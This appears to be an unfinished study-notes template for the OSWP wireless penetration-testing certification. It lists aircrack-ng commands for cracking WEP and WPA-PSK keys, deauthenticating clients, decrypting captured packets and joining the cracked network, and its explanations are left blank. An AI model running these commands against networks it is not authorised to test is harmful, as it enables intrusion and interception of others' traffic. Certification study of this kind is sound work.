## # OSWP
*Description:*


## Cracking WEP (p74)
*Description:*

```bash
airmon-ng start wlan0  # [Explain this command]
airodump-ng mon0  # [Explain this command]
airodump-ng -c [channel] --bssid [target MAC] -w wepcrack mon0  # [Explain this command]
aireplay-ng -3 -b [target MAC] -h [your MAC] mon0  # [Explain this command]
aircrack-ng wepcrack-01.cap  # [Explain this command]

```
## Cracking WPA-PSK Weak Passphrase (p85)
*Description:*

```bash
airmon-ng start wlan0  # [Explain this command]
airodump-ng mon0  # [Explain this command]
airodump-ng --bssid [target MAC] -c [channel] -w wpacrack mon0  # [Explain this command]
aireplay-ng --deauth 10 -a [target MAC] -c [client MAC] mon0  # [Explain this command]
aircrack-ng -w /path/to/wordlist.txt -b [target MAC] wpacrack-01.cap  # [Explain this command]

```
## Decrypting WEP and WPA Packets (p94)
*Description:*

# WEP
airdecap-ng -w [WEP key] wepcrack-01.cap
# WPA
airdecap-ng -e [ESSID] -p [passphrase] wpacrack-01.cap

## Connecting to WEP Network (p96)
*Description:*

```bash
ifconfig wlan0 down  # [Explain this command]
iwconfig wlan0 essid [network name]
iwconfig wlan0 key s:[WEP key]
ifconfig wlan0 up  # [Explain this command]
dhclient wlan0

```
## Connecting to WPA Network (p97)
*Description:*

```bash
wpa_passphrase [network name] [passphrase] > wpa.conf  # [Explain this command]
wpa_supplicant -B -Dwext -i wlan0 -c wpa.conf  # [Explain this command]
dhclient wlan0
```